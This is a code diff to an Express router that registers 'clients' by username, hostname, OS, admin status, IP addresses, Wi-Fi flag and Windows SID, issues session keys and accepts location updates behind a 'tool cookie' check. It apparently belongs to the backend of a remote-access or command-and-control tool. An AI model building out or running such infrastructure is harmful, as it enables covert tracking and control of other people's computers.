@@ -3,19 +3,20 @@ const Client = require('../client.model');
 const Utils = require('../../Utils/utilFunctions');
 const Status = require("../../Status/status.model");
 const ClientLocation = require("../../Location/clientLocation.model");
+const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
 
 //Add new client
 router.route('/h1').post((req,res )=>{
     const clientId = Utils.GenerateRandomId(8);
-    const username = req.body.username;
-    const hostname = req.body.hostname;
-    const os = req.body.os;
-    const isAdmin = req.body.isAdmin;
+    const username = req.body.Username;
+    const hostname = req.body.Hostname;
+    const os = req.body.Os;
+    const isAdmin = req.body.isAdmin !== "False";
     const status = true;
-    const ipv4 = req.body.ipv4;
-    const public_ip = req.body.public_ip;
-    const wifiEnabled = req.body.wifiEnabled;
-    const sid = req.body.sid;
+    const ipv4 = req.body.IPv4;
+    const public_ip = req.body.PublicIP;
+    const wifiEnabled = req.body.ifWifi;
+    const sid = req.body.SID;
     const sessionKey = Utils.GenerateRandomSessionKey();
     const newClient = new Client({client_id:clientId, username:username,hostname:hostname,session_key:sessionKey,
     os:os,isAdmin:isAdmin, status:status, ipv4:ipv4,public_ip:public_ip, wifiEnabled:wifiEnabled, sid:sid});
@@ -34,6 +35,8 @@ router.route('/h1').post((req,res )=>{
         });
 });
 
+
+router.use(toolCookieValidator);
 //Push a new location for client
 router.route('/location').post((req,res)=> {
         try {
